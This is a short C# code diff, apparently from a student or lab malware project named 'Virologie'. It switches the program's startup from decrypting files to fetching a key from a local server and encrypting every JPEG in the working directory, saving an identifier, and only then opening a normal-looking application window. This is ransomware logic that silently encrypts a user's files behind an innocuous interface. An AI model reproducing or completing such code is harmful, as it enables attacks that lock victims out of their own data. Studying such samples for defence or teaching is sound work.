@@ -16,10 +16,12 @@ namespace Virologie
         static void Main()
         {
             FileExplorer explorer = new FileExplorer();
-            //FileEncrypter encrypter = CryptoKeyManager.CreateFromServer("http://localhost:1234/");
-            //explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.jpg", encrypter.Encrypt);
-            FileEncrypter encrypter = CryptoKeyManager.CreateFromFile("029c3d70-a107-474d-8f70-6ced21c8b68b");
-            explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.crypt", encrypter.Decrypt);
+            FileEncrypter encrypter = CryptoKeyManager.CreateFromServer("http://localhost:1234/");
+            if (encrypter != null)
+            {
+                explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.jpg", encrypter.Encrypt);
+                CryptoKeyManager.SaveGUID();
+            }
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
